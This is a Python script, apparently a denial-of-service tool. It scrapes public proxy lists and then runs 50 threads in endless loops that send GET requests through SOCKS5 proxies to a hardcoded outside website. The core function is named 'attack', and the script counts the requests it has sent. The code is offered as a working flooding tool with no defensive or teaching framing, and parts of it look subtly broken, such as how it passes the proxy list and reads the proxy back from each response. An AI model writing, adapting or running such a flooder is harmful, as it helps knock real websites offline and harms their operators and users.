
from proxio import *
import asyncio 
import requests
import threading

from cachecontrol import CacheControl
from cachecontrol.caches import FileCache

sent=0

async def attack(url, session) -> None:

    # Global Vars
    global socks4_proxies
    global socks5_proxies
    global http_proxies
    global https_proxies
    global sent

    r = session.get(url, headers={"User-Agent": "Sym", "Accept-Encoding": "deflate"}, proxies={"socks5": socks5_proxies})
    sent+=1
    print(f"{sent} // Status: {r.status_code} // {r.proxies.get("socks5")}")

def init(url, session) -> None:
    while 1:
        asyncio.run(attack(url, session))

if __name__ == "__main__":

    # Perform a default scrape of the proxio module
    proxies_array = default_scrape()

    # Step 4: Filter Proxies into their own seperate arrays
    socks4_proxies = Filter.filter_socks4_proxies(proxies_array)
    socks5_proxies = Filter.filter_socks5_proxies(proxies_array)
    http_proxies = Filter.filter_http_proxies(proxies_array)
    https_proxies = Filter.filter_https_proxies(proxies_array)
        
    threads = []

    session = CacheControl(requests.Session(), cache=FileCache(".web_cache"))

    for x in range(50):
        t = threading.Thread(target=init, args=["https://999root-search.online/", session])
        t.daemon=True
        threads.append(t)

    for x in range(50):
        threads[x].start()

    for x in range(50):
        threads[x].join()
